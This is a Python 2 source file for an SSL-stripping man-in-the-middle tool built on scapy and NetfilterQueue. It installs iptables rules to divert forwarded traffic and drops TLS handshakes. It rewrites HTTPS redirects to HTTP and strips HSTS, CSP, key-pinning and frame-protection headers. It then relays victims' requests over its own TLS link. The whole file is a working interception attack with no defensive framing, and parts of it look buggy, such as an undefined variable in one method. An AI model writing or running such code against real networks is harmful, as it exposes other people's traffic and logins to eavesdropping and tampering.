from scapy.all import *
from netfilterqueue import NetfilterQueue
from scapy.layers.http import *
from scapy.layers.tls import *
import scapy

import os
import threading
import cryptography    #required for tls

load_layer("tls")
load_layer("http")

class SslRemover():

    def __init__(self, queue_num):

        self.queue         = NetfilterQueue()
        self.iprule_add    = "iptables -A FORWARD -p tcp -j NFQUEUE --queue-num {}".format(queue_num)
        self.iprule_remove = "iptables -D FORWARD -p tcp -j NFQUEUE --queue-num {}".format(queue_num)

        self.thread        = threading.Thread(name="ssl-remover-{}".format(queue_num), target=self.queue.run)
        self.thread.setDaemon(True)
        self.connected_tls = False
        self.current_url   = None

        self.queue.bind(queue_num, self.handle_packet)

    def start_tls_automaton(self, url):
        print "start tls automaton"
        self.connection = TLSClientAutomaton.tlslink(HTTP, server=url, dport=443,ciphersuite=49199)
        self.connected_tls = True
        
        print "Connection TLS started with", url

    def close_tls_automaton(self):
        print "stop tls automaton"
        self.connection.close_session()
        self.connected_tls = False
        print "Connection TLS ended with", url
    
    def handle_packet(self, packet_nfqueue):
        """Handles each packet in the queue by parsing them and editing them."""
        packet_scapy = IP(packet_nfqueue.get_payload()) #converts the raw packet to a scapy compatible string

        if packet_scapy.haslayer(TLSClientHello):
            return packet_nfqueue.drop()

        if packet_scapy.haslayer(TLSServerHello):
            self.connection.recv(packet_scapy)

        if packet_scapy.haslayer(HTTPResponse): #read the scapy string to check for HTTP responses from the server
            
            if not packet_scapy[HTTPResponse].Location==None:
                packet_scapy[HTTPResponse].Location = (packet_scapy[HTTPResponse].Location).replace("https://", "http://") #edit the redirect location to a http address instead of https

            #delete cookies that might interfere
            del packet_scapy[HTTPResponse].Strict_Transport_Security
            del packet_scapy[HTTPResponse].Public_Key_Pins
            del packet_scapy[HTTPResponse].Content_Security_Policy
            del packet_scapy[HTTPResponse].X_XSS_Protection
            del packet_scapy[HTTPResponse].X_Frame_Options

            packet_nfqueue.set_payload(bytes(packet_scapy))

        elif packet_scapy.haslayer(HTTPRequest):
            
            if not packet_scapy[HTTPRequest].Path == "/":
                return packet_nfqueue.accept()

            http_layer = packet_scapy[HTTPRequest]
            ip_layer = packet_scapy[IP]
            url = http_layer.Host.decode()

            packet_scapy[HTTPRequest].Upgrade_Insecure_Requests = None
            packet_nfqueue.set_payload(bytes(packet_scapy))
    
            # Create a new HTTP packet to forward the request
            new_packet = IP(src=ip_layer.src, dst=ip_layer.dst) / \
                         TCP(sport=packet_scapy[TCP].sport, dport=packet_scapy[TCP].dport, flags="PA") / \
                         HTTP() / \
                         HTTPRequest(
                             Method=http_layer.Method,
                             Host=http_layer.Host,
                             Path=http_layer.Path,
                             User_Agent=http_layer.User_Agent,
                             Accept=http_layer.Accept,
                             Accept_Language=http_layer.Accept_Language,
                             Accept_Encoding=http_layer.Accept_Encoding,
                             Connection=b'close'
                         )
            if url != self.current_url and url not in ["detectportal.firefox.com", "r3.o.lencr.org"]:
                try:
                    self.close_tls_automaton()
                except Exception as e:
                    print e
                print "Changed current url to", url

                self.start_tls_automaton(ip_layer.dst)
                self.current_url = url
            elif url in ["detectportal.firefox.com", "r3.o.lencr.org"]:
                return packet_nfqueue.accept()
                
            self.connection.send(new_packet)
            return packet_nfqueue.drop()

        return packet_nfqueue.accept() #accept the packet and release it back into the wild
        
      
    def start(self):

        os.system(self.iprule_add)
        os.system("iptables -t nat -A POSTROUTING -o enp0s10 -j MASQUERADE")
        os.system("iptables -A OUTPUT -p tcp --tcp-flags RST RST -j DROP")
        
        self.thread.start()    #queue starts accepting packages
        print "Start SSL Stripping"


    def stop(self):

        os.system(self.iprule_remove)

        self.queue.unbind()    #delete queue
        print "Stop SSL Stripping"
